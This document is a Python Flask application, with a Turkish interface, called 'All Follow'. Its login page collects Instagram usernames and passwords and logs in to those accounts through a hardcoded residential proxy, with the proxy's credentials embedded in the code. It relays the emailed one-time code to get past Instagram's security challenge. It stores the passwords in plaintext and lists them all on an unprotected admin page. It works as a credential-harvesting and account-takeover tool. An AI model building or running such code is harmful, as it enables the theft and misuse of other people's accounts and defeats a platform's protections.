import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, EmailRequired

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_v4.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

# Geçici olarak client nesnelerini hafızada tutmak için (Kod onayı için gerekli)
clients = {}

@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>All Follow | Challenge Fix</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200 font-sans">
        <div class="bg-[#161b2c] p-8 rounded-[2rem] w-full max-w-[380px] border border-slate-800 shadow-2xl text-center">
            <h1 class="text-3xl font-black text-blue-500 italic mb-6">ALL FOLLOW</h1>
            
            <div id="login-form" class="space-y-4">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all">
                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 transition-all">BAĞLAN</button>
            </div>

            <div id="otp-form" class="hidden space-y-4 mt-4">
                <p class="text-xs text-yellow-500 font-bold uppercase">E-Posta Kodunu Girin</p>
                <input id="otp" placeholder="6 Haneli Kod" class="w-full bg-[#0a0f1e] border border-yellow-800 p-4 rounded-xl outline-none text-center tracking-widest text-xl">
                <button onclick="verifyOtp()" class="w-full bg-yellow-600 py-4 rounded-xl font-bold hover:bg-yellow-500 transition-all">KODU ONAYLA</button>
            </div>
            
            <p id="msg" class="text-xs mt-6 font-semibold text-slate-500 uppercase"></p>
        </div>

        <script>
            let currentUsername = "";
            async function login() {
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                currentUsername = u;
                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
                btn.disabled = true; msg.innerText = "Bağlanılıyor...";
                
                const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                const d = await r.json();
                
                if(d.status === "challenge") {
                    document.getElementById('login-form').classList.add('hidden');
                    document.getElementById('otp-form').classList.remove('hidden');
                    msg.innerText = "E-postanıza bir kod gönderildi!";
                } else {
                    msg.innerText = d.msg;
                    btn.disabled = false;
                }
            }

            async function verifyOtp() {
                const code = document.getElementById('otp').value;
                const msg = document.getElementById('msg');
                msg.innerText = "Kod onaylanıyor...";
                
                const r = await fetch('/api/verify-otp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, code:code})});
                const d = await r.json();
                
                msg.innerText = d.msg;
                if(d.status === "success") {
                    setTimeout(() => location.reload(), 2000);
                }
            }
        </script>
    </body>
    </html>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u').strip().lower(), data.get('p').strip()
    
    cl = Client()
    cl.set_proxy(PROXY_URL)
    clients[u] = cl # Client'ı hafızaya alıyoruz

    try:
        cl.login(u, p)
        # Başarılı ise veritabanına ekle
        user = PoolUser.query.filter_by(username=u).first()
        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Giriş başarılı!")

    except ChallengeRequired:
        # Instagram kod istiyor!
        cl.challenge_code_handler = None # Otomatik handler'ı kapat
        return jsonify(status="challenge", msg="Kod gerekli")
    
    except Exception as e:
        return jsonify(status="error", msg=str(e)[:50])

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)

    if not cl: return jsonify(status="error", msg="Oturum zaman aşımı")

    try:
        # Kodu Instagram'a gönder
        cl.login(u, cl.password, verification_code=code)
        user = PoolUser.query.filter_by(username=u).first()
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Hesap başarıyla havuza eklendi!")
    except Exception as e:
        return jsonify(status="error", msg="Kod hatalı veya süresi dolmuş.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Havuzu ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
